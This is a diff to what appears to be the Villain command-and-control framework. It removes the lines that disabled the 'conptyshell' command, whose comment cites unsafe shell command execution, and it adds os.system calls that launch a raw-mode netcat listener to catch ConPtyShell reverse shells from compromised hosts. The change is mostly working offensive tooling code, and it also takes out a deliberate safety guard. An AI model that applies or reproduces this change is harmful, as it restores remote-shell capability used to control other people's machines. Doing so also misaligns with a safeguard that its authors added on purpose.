@@ -141,6 +141,7 @@ def do_nothing():
 
 
 def print_meta():
+	print(f'{META} Version {Villain.version}')
 	print(f'{META} Created by t3l3machus')
 	print(f'{META} Follow on GitHub, X, YT: @t3l3machus')
 	print(f'{META} Thank you!\n')
@@ -1078,8 +1079,6 @@ def main():
 
 
 				elif cmd == 'conptyshell':
-					print(f'\r[{ERR}] ConPtyShell is disabled because its listener requires unsafe shell command execution.')
-					continue
 					
 					lhost = parse_lhost(cmd_list[1])
 					try: lport = int(cmd_list[2])
@@ -1152,6 +1151,8 @@ def main():
 							villain_cmd['issuer'] = 'self'
 
 							# Start listener
+							os.system(f'gnome-terminal -- bash -c "stty raw -echo; (stty size; cat) | nc -lvnp {lport}"')
+							sleep(0.2)
 							Hoaxshell.command_pool[session_id].append(villain_cmd)
 
 						else:
@@ -1164,6 +1165,7 @@ def main():
 							
 							if verified.lower().strip() in ['y', 'yes']:
 								# Start listener
+								os.system(f'gnome-terminal -- bash -c "stty raw -echo; (stty size; cat) | nc -lvnp {lport}"')
 								villain_cmd['issuer'] = core.return_server_uniq_id()
 								Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, villain_cmd)
 										
